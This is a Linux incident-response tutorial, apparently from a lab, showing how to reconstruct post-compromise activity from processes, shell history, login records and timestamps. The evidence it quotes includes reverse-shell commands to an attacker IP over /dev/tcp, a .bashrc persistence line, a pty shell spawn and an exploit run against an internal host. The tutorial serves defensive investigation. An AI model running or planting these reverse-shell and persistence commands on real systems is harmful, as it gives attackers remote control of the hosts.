# Linux: Execution, History, and Timeline Analysis

[🇮🇩 Baca dalam Bahasa Indonesia](linux-enumeration-investigation.md)

This time, we look at the activity that occurred on a Linux system from the server side.

The question we want to answer is:

> **After the attacker obtained a shell, what activity occurred on the system? What was executed, who executed it, and in what order?**

To understand this, we will look at several artifacts that can be observed on the system:

* **Execution**
* **History**
* **Timeline**

---

# What is Linux Enumeration Analysis?

Linux Enumeration Analysis is the process of analyzing reconnaissance activity that occurs after an attacker gains access to a Linux system.

At this stage, we do not immediately run various enumeration commands as the attacker.

Instead, we look at the **activity traces that have already appeared on the system** to understand what happened.

Some of the things that can be observed include:

* What commands were executed.
* Which user executed them.
* Whether there was a login session.
* When the activity occurred.
* What the order of the activity was.

---

# Why is it Important?

After obtaining a shell, an attacker usually needs to understand the system they have accessed.

This activity can leave behind several artifacts, such as:

* Shell history.
* Login session information.
* Currently active users.
* Processes that are still running.
* Timestamps from various artifacts.

These artifacts can help us understand the activity that occurred on the system.

However, not all activity will leave complete traces.

Logs can be deleted, history can be disabled, processes can finish before they are examined, and timestamps also have limitations.

Therefore, we do not rely on a single source. Multiple artifacts need to be examined and compared to obtain a more complete picture of the activity.

---

# Analysis Flow

```text
                 Enumeration
                      │
          ┌───────────┼───────────┐
          ▼           ▼           ▼
      Execution     History    Timeline
          │           │           │
          └───────────┼───────────┘
                      ▼
                 Correlation
                      │
                      ▼
             Activity Reconstruction
```

---

# Lab Topology

| Role         | Description   | IP Address     |
| :----------- | :------------ | :------------- |
| **Attacker** | Kali Linux    | `10.10.10.149` |
| **Target**   | Ubuntu Server | `10.10.10.2`   |

---

# Demonstration

## 1. Execution

The first step is to look at the **processes currently running** on the system and look for relevant execution activity.

```bash
ps aux | grep -E "bash|sh|python3"
```

![Process Enumeration](process-enumeration.png)

### What was found?

The output shows several relevant processes, including:

```text
root  416    bash -c while :; do bash -i >& /dev/tcp/10.10.10.149/9001 ...
root  13766  bash -i
root  13870  python3 -c import pty; pty.spawn("/bin/bash")
root  13871  /bin/bash
```

Several important pieces of information can be observed:

* **User** running the process.
* **PID** of the process.
* **Command** being executed.
* **Parent/child process** if necessary.
* **Time and status** of the process.
* Network activity directly visible in the command.

### What does the output mean?

The `bash -c` process on PID `416` shows a loop that runs an interactive Bash and creates a connection to:

```text
10.10.10.149:9001
```

Meanwhile, PID `13870` runs:

```text
python3 -c import pty; pty.spawn("/bin/bash")
```

which then produces the `/bin/bash` process on PID `13871`.

At this stage, the name `bash` or `python3` alone is not enough to determine whether a process is suspicious. What matters more is the **context of the command being executed**.

In this case, the command provides a strong indication of **remote shell activity** because there is a connection to an external host through `/dev/tcp`.

The process can then be compared with **logs and network connections** to examine the relationship between the activities occurring on the system.

---

## 2. History

Next, we look at the shell history to find out which commands have previously been executed on the system.

```bash
history
```

![Shell History](history1.png)
![Shell History](history2.png)
![Shell History](history3.png)

### What was found?

The shell history shows various activities performed on the system, ranging from persistence, connections to other hosts, network configuration, to attempted lateral movement.

For example:

```text
./panix.sh --generator --ip 10.10.10.149 --port 9001
nano /etc/systemd/system/persistence.service
echo "/bin/bash -i >& /dev/tcp/10.10.10.149/9001 0>&1" >> ~/.bashrc
ss -tnp | grep 10.10.10.149
python3 cve-2026-4480.py -t 192.168.15.2 -l 10.10.10.2 -p 4444
smbclient -L 192.168.15.2 -N
```

### What does the output mean?

These commands indicate that activity on the server did not stop at the initial reconnaissance.

Several activity patterns can be seen:

```text
Persistence
    ↓
C2 / Reverse Shell
    ↓
Network Configuration
    ↓
Pivoting
    ↓
Lateral Movement
```

For example:

* `panix.sh` indicates activity related to persistence.
* `~/.bashrc` and `systemd` indicate changes to startup mechanisms.
* `10.10.10.149:9001` indicates communication with the attacker's host.
* `ip addr`, `ip route`, and `iptables` indicate activity related to networking and forwarding.
* `cve-2026-4480.py` and `smbclient` indicate activity toward the internal host `192.168.15.2`.

Therefore, history helps us see the **sequence and progression of attacker activity**, rather than just a single standalone command.

History remains **one piece of evidence** and can be compared with processes, logs, network connections, file modifications, and other artifacts.

---

### If History is Not Available

If `history` does not provide enough information, we can directly examine the Bash history file stored in the filesystem.

```bash
ls -la ~/.bash_history
```

On this server, the history file was found:

```text
-rw------- 1 root root 49227 Sep 16 03:19 /root/.bash_history
```

The file is owned by `root` with `0600` permissions and is approximately 49 KB in size.

Next, we look at the file metadata:

```bash
stat ~/.bash_history
```

The output shows the last modification time of the file:

```text
Modify: 2026-09-16 03:19:11
Change: 2026-09-16 03:19:11
```

This information can be used as part of **timeline analysis**, then compared with other evidence such as processes, logs, network connections, and file changes.

Therefore, the `.bash_history` file is not merely a place to view commands, but also one of the artifacts that can help us understand activity on the system.

---

## 3. Login Activity

To find the login sessions recorded on the system, we can use:

```bash
last
```

![Login History](last.png)

### What was found?

The output shows several sessions from the `moon` user from different source addresses.

For example:

```text
moon     pts/5   10.10.10.1   Wed Sep 16 09:41   still logged in
moon     pts/0   10.10.10.1   Wed Sep 16 08:53   still logged in
moon     pts/2   10.10.10.1   Wed Sep 16 03:08   gone - no logout
```

There are also previous sessions originating from the internal network:

```text
moon     pts/2   192.168.15.1
moon     pts/0   192.168.15.1
moon     pts/0   192.168.15.2
```

### What does the output mean?

`last` helps us see **who logged in, where they logged in from, and when the session took place**.

This information can be used to establish a timeline relationship:

```text
Source Address
      ↓
User
      ↓
Login Time
      ↓
Session
      ↓
Activity Evidence
```

For example, if the history shows a particular activity around `03:08`, the `moon` session recorded at that time can become one of the points to compare with other evidence.

The `gone - no logout` status is also recorded as a session condition without a normal logout. This does not automatically mean malicious activity, but it can be a point worth examining when compared with processes, history, logs, and network activity.

Therefore, `last` helps answer the question:

> **Who had a session on the system, where did the session originate, and when did the activity take place?**

---

## 4. Active Users

Next, we can see the users who are currently active on the system:

```bash
who
```

![Active Users](who.png)

### What was found?

At the time of the examination, several `moon` sessions were active:

```text
moon  pts/0  2026-09-16 08:53 (10.10.10.1)
moon  pts/1  2026-09-16 08:53 (10.10.10.1)
moon  pts/2  2026-09-16 03:08 (10.10.10.1)
moon  pts/3  2026-09-16 03:08 (10.10.10.1)
moon  pts/5  2026-09-16 09:41 (10.10.10.1)
moon  pts/6  2026-09-16 09:41 (10.10.10.1)
```

We can see that the `moon` user has several active terminals and all sessions originate from `10.10.10.1`.

### What does the output mean?

`who` provides a **snapshot of the sessions that are active at the time of the examination**.

This information can be used to see:

```text
User
  ↓
Terminal
  ↓
Login Time
  ↓
Source Address
```

If suspicious activity occurred around the same time, the session can be compared with `history`, `last`, processes, and network connections.

`who` itself does not show the commands that were executed or all previous activity.

---

# 5. Timeline

After looking at `history`, `last`, `who`, and process information, we begin combining the available timestamps.

For example:

```text
03:08
│
├── User moon session started
│
├── pts/2
└── pts/3
        │
        ▼
        Shell Activity
        │
        ├── Command in history
        └── Running process
```

The timeline does not have to be complete immediately.

The goal is to find relationships between **session time, commands, processes, and other evidence**.

For example, there may be activity in `history` around `03:08`, while `last` shows that the `moon` session also started at that time.

This provides a point that can be examined further.

```text
Login
  ↓
Shell Activity
  ↓
Process
  ↓
Network / Log
```

Timeline analysis helps answer:

> **What activity occurred, and in what order?**

---

# 6. Correlation

After finding several pieces of evidence, we do not immediately draw a conclusion from a single output.

We connect them.

For example:

```text
last
 │
 └── moon @ 10.10.10.1
          │
          ▼
       history
          │
          ├── whoami
          ├── id
          ├── uname
          └── ls
          │
          ▼
       process
          │
          ▼
    network / log
```

From this relationship, we can form a hypothesis:

> After obtaining access to the server, there was local reconnaissance activity to understand the user, privileges, operating system, and filesystem.

This hypothesis is then compared with other evidence.

If the process, history, login activity, and network show related times or activities, the picture of that activity becomes stronger.

However, if the evidence contradicts each other, the sources need to be examined again.

---

# Recognizing Activity Patterns

From the evidence that has been collected, we can begin to see patterns of activity occurring on the system.

These patterns are not always the same. Analysis depends heavily on **the time of the event, infrastructure type, system architecture, network path, access mechanism, logging configuration, and artifacts that are still available**.

### Activity on the System

In a simple case, the analysis may only find activity on a single host. From there, we can determine whether the activity is related to initial access, system changes, or a particular objective.

Not all suspicious activity means that an intrusion occurred. Time, user, source address, process, file, and network connection context need to be considered before drawing a conclusion.

### Activity on a Web Server

On a web server, the analysis can be different because the activity may involve the web application, filesystem, database, and network.

For example, if a change is found in a web application, we can examine whether the change is related to a particular request, a running process, a file modification, or other activity on the server.

The goal is not simply to find a change, but to understand **how the change occurred and whether there was other related activity**.

### More Complex Intrusions

In more complex infrastructure, activity may involve multiple hosts and network segments. The analysis then follows the evidence that is found.

For example, one host may show indications of compromise, but the subsequent activity may actually have occurred through another host. We need to examine the relationship between hosts, authentication, network connections, and which systems can be reached from that host.

However, not every stage of an intrusion will be completely visible.

Evidence may be lost because:

* logging was unavailable or was never enabled;
* logs were deleted or overwritten;
* the process had already stopped;
* files had already changed;
* the session had already ended;
* the activity occurred on another host that has not yet been examined.

Therefore, we should not force an attack chain to appear complete.

What matters is distinguishing between **facts supported by evidence**, **conclusions that can be drawn**, and **parts that are still unknown**.

Ultimately, activity patterns help us **connect evidence, build a timeline, test hypotheses, and understand how far the activity can be reconstructed from the evidence that is still available**.

---

# Findings Summary

| Evidence           | What We Look For                                  |
| :----------------- | :------------------------------------------------ |
| **Execution**      | Processes and commands that are currently running |
| **History**        | Commands stored from the shell                    |
| **Login Activity** | User, session, source, and login time             |
| **Timeline**       | Sequence of events based on timestamps            |
| **Correlation**    | Relationships between evidence                    |

No single command immediately provides the complete answer.

Multiple pieces of evidence need to be examined together to understand **what happened on the system**.

---

# What is the Next Step?

From the previous analysis, we have already found indications of reconnaissance activity.

The next question is:

> **After the attacker performed reconnaissance, what files were examined or modified?**

Therefore, the next discussion will move to **File System Analysis**.

The focus will be:

* Changed files.
* Examined directories.
* File timestamps.
* Webroot.
* Configuration.
* Artifacts left behind by the attacker.

---

# Conclusion

Linux Enumeration Analysis is not simply about running commands to view system information.

By looking at processes, history, login activity, and timestamps, we can understand various activities that occurred after the system was accessed.

```text
Execution
   +
History
   +
Login Activity
   +
Timeline
      ↓
Correlation
      ↓
Activity Reconstruction
```

From here, we can move from simply **looking at command output** to **understanding the relationships between activities on the system**.

And when those activities begin to involve the filesystem, the discussion can continue into **File System Analysis**.

---

## References

* `last` – Linux Manual Page
  https://man7.org/linux/man-pages/man1/last.1.html

* `who` – Linux Manual Page
  https://man7.org/linux/man-pages/man1/who.1.html

* Bash Reference Manual – Startup Files
  https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html

* Bash Reference Manual – History
  https://www.gnu.org/software/bash/manual/html_node/Bash-History-Builtins.html

* `stat` – Linux Manual Page
  https://man7.org/linux/man-pages/man1/stat.1.html

* MITRE ATT&CK – Linux
  https://attack.mitre.org/matrices/enterprise/linux/

---

Thank you.
